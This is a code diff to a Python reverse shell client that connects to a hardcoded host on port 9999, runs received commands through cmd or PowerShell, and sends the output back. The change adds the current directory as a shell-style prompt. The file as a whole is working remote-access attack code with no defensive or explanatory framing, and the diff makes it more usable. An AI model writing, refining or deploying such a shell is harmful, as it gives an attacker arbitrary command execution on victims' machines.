@@ -1,10 +1,10 @@
 import socket
 import subprocess
 
-HOST = '192.168.50.39'  # Replace with your Linux host IP
+HOST = '192.168.50.39'
 PORT = 9999
 
-mode = "cmd"  # Default to CMD mode
+mode = "cmd"
 
 with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
     s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
@@ -26,19 +26,29 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
 
         try:
             if mode == "ps":
+                # Run command and capture both output and working directory
+                prompt = subprocess.check_output(
+                    ["powershell.exe", "-NoProfile", "-Command", "(Get-Location).Path"],
+                    stderr=subprocess.STDOUT,
+                    text=True
+                ).strip()
                 output = subprocess.check_output(
                     ["powershell.exe", "-NoProfile", "-Command", command],
                     stderr=subprocess.STDOUT,
                     text=True
                 )
-            else:  # CMD mode
+                full_output = f"{prompt}> {command}\n{output}"
+            else:
+                # CMD mode
+                prompt = subprocess.check_output("cd", shell=True, text=True).strip()
                 output = subprocess.check_output(
                     command,
                     shell=True,
                     stderr=subprocess.STDOUT,
                     text=True
                 )
+                full_output = f"{prompt}> {command}\n{output}"
         except subprocess.CalledProcessError as e:
-            output = e.output
+            full_output = f"{prompt}> {command}\n{e.output}"
 
-        s.sendall(output.encode())
+        s.sendall(full_output.encode())
